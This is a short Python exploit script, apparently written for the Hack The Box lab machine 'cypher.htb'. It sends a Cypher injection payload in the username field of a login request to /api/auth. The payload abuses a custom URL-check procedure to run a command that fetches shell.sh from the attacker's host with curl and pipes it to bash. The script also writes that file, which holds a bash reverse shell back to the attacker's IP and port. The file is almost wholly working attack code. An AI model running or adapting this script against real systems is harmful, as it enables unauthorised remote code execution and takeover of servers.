import requests
import json
import sys, os
cleanup = False
if len(sys.argv) == 2:
    if sys.argv[1] == "clean-up":
        cleanup = True
        def cleanUp():
            os.remove("payload.json")
            os.remove("shell.sh")

lhost = "10.10.15.12" # Change this
lport = 4444 # Change this
rhost = "cypher.htb" # Change this?
httpport = 8000 # Change this?

reverse_shell_content = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
injection_payload = f"' RETURN h.value AS hash UNION CALL custom.getUrlStatusCode(\"127.0.0.1; curl http://{lhost}:{httpport}/shell.sh|bash\") YIELD statusCode AS hash RETURN hash; //"

def makeFiles():
    jsonFileContent = {
        "username": injection_payload,
        "password": "tRH"
    }
    with open("payload.json", "w") as f:
        json.dump(jsonFileContent, f)
    print(f"[+] Created {f.name}")
    with open("shell.sh", "w") as f:
        f.write(reverse_shell_content)
    print(f"[+] Created {f.name}")
    return 0

def Exploit():
    url = f"http://{rhost}/api/auth"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Orgin": f"http://{rhost}",
        "Referer": f"http://{rhost}/login",
        "Priority": "u=0",
        "Connection": "keep-alive"
    }
    with open("payload.json", "r") as d:
        data = d.read()
    print(f"[+] Sending {d.name} to {rhost}")
    r = requests.post(url, headers=headers, data=data)
    return 0

if __name__ == "__main__":
    makeFiles()
    Exploit()
    if cleanup is True:
        cleanUp()
    exit(0)
